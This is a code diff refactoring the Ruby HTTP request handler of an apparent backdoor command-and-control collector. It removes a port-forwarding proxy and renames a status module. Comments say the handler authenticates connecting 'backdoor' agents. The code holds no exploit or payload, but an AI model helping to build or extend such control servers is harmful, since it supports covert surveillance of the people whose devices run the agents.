@@ -10,14 +10,13 @@ require_relative 'sessions'
 
 # from RCS::Common
 require 'rcs-common/trace'
-require 'rcs-common/status'
+require 'rcs-common/systemstatus'
 
 # system
 require 'benchmark'
 require 'eventmachine'
 require 'evma_httpserver'
 require 'socket'
-require 'em-proxy'
 require 'net/http'
 
 module RCS
@@ -83,50 +82,29 @@ class HTTPHandler < EM::Connection
     #trace :debug, "[#{@peer}] Incoming HTTP Connection"
     trace :debug, "[#{@peer}] Request: [#{@http_request_method}] #{@http_request_uri} #{@http_query_string}"
     
-    resp = EM::DelegatedHttpResponse.new(self)
-
+    response = nil
+    
     # Block which fulfills the request
     operation = proc do
-
+    
       # do the dirty job :)
       # here we pass the control to the internal parser which will return:
       #   - the content of the reply
       #   - the content_type
       #   - the cookie if the backdoor successfully passed the auth phase
       begin
-        http_headers = @http_headers.split("\x00")
-        status, content, content_type, cookie = http_parse(@http_headers.split("\x00"), @http_request_method, @http_request_uri, @http_cookie, @http_post_content, @http_query_string)
+        response = http_parse(@http_headers.split("\x00"), @http_request_method, @http_request_uri, @http_cookie, @http_post_content, @http_query_string)
       rescue Exception => e
         trace :error, "ERROR: " + e.message
         trace :fatal, "EXCEPTION: " + e.backtrace.join("\n")
       end
-
-      status = RCS::DB::RESTController::STATUS_SERVER_ERROR if status.nil? or status.class != Fixnum
-      
-      # prepare the HTTP response
-      resp.status = status
-      # status_string from status code
-      resp.status_string = Net::HTTPResponse::CODE_TO_OBJ["#{resp.status}"].name.gsub(/Net::HTTP/, '')
-      resp.content = content
-      resp.headers['Content-Type'] = content_type
-      resp.headers['Set-Cookie'] = cookie unless cookie.nil?
-
-      if @http_headers.split("\x00").index {|h| h['Connection: keep-alive'] || h['Connection: Keep-Alive']} then
-        # keep the connection open to allow multiple requests on the same connection
-        # this will increase the speed of sync since it decrease the latency on the net
-        resp.keep_connection_open true
-        resp.headers['Connection'] = 'keep-alive'
-      else
-        resp.headers['Connection'] = 'close'
-      end
-
     end
-
+    
     # Callback block to execute once the request is fulfilled
     callback = proc do |res|
-      resp.send_response
+      response.send_response(self) unless response.nil?
     end
-
+    
     # Let the thread pool handle request
     EM.defer(operation, callback)
   end
@@ -136,37 +114,11 @@ end #HTTPHandler
 
 class Events
   include RCS::Tracer
-
-  def start_proxy(local_port, server, server_port)
-    Thread.new do
-      trace :info, "Forwarding port #{local_port} to #{server}:#{server_port}..."
-      
-      Proxy.start(:host => "0.0.0.0", :port => local_port, :debug => false) do |conn|
-        conn.server :srv, :host => server, :port => server_port
-
-        conn.on_data do |data|
-          data
-        end
-
-        conn.on_response do |backend, resp|
-          resp
-        end
-
-        conn.on_finish do |backend, name|
-          unbind if backend == :srv
-        end
-      end
-    end
-  end
   
   def setup(port = 4444)
 
     # main EventMachine loop
     begin
-
-      #start the proxy for the XML-RPC calls
-      #TODO: remove this...
-      start_proxy(port - 1, Config.instance.global['DB_ADDRESS'], port - 1) if not File.exists?('C:/RCSDB/etc/RCSDB.ini')
 
       # all the events are handled here
       EM::run do
@@ -177,7 +129,7 @@ class Events
         EM.threadpool_size = 50
 
         # we are alive and ready to party
-        Status.my_status = Status::OK
+        SystemStatus.my_status = SystemStatus::OK
 
         # start the HTTP REST server
         EM::start_server("0.0.0.0", port, HTTPHandler)
